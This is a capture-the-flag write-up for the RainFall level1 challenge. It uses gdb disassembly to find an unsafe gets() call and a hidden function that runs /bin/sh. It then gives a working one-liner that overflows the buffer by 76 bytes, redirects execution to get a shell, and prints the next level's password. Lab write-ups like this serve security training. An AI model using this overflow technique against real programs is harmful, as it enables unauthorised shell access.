(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.

We can see there a call to gets(). Here's the man "Because it is impossible
to tell without knowing the data in advance  how  many  characters gets()  will  read,
and  because  gets()  will continue to store characters past the end of the buffer"

We use this command to verify we didn't forget anything:

(gdb) info function
All defined functions:

Non-debugging symbols:
...
0x08048340  gets@plt
0x08048350  fwrite@plt
0x08048360  system@plt
...
0x08048444  run
0x08048480  main
...

We see a fwrite and a system call in the run function

(gdb) disass run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
...
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
...
End of assembler dump.

There's a system call that take the 0x8048584 parameter

(gdb) x/s 0x8048584
0x8048584:	"/bin/sh"

system is going to launch /bin/sh

Gets allows use to make a buffer overflow. To do that, we need to find the size of our buffer

We use wiremask to find the offset (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

(gdb) r
Starting program: /home/user/level1/level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

The offset is 76.

We re going the rewrite EIP with the run address to launch it.
To do that, we need a string of 76 chars followed by the run address 0x08048444

level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

